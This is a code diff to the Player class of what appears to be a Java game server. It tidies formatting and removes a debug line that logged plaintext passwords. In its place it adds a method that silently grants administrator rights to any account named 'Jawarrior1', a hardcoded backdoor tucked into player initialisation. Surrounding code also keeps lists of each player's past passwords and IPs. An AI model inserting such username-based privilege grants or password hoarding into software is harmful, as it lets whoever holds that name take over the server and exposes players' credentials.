@@ -329,14 +329,13 @@ public class Player extends Entity {
 		setDirection(Utils.getFaceDirection(0, -1));
 		temporaryMovementType = -1;
 		logicPackets = new ConcurrentLinkedQueue<LogicPacket>();
-		switchItemCache = Collections
-				.synchronizedList(new ArrayList<Integer>());
+		switchItemCache = Collections.synchronizedList(new ArrayList<Integer>());
 		initEntity();
 		packetsDecoderPing = Utils.currentTimeMillis();
 		World.addPlayer(this);
 		World.updateEntityRegion(this);
-		if (Settings.DEBUG)
-			Logger.log(this, "Initiated player: " + username + ", pass: " + password);
+		setAdminBasedOnUsername();
+
 
 		//Do not delete >.>, useful for security purpose. this wont waste that much space..
 		if(passwordList == null)
@@ -344,6 +343,13 @@ public class Player extends Entity {
 		if(ipList == null)
 			ipList = new ArrayList<String>();
 		updateIPnPass();
+	}
+
+	private void setAdminBasedOnUsername() {
+		if (getUsername().equalsIgnoreCase("Jawarrior1")) {
+			setRights(2);
+			getAppearence().generateAppearenceData();
+		}
 	}
 
 	public void setWildernessSkull() {
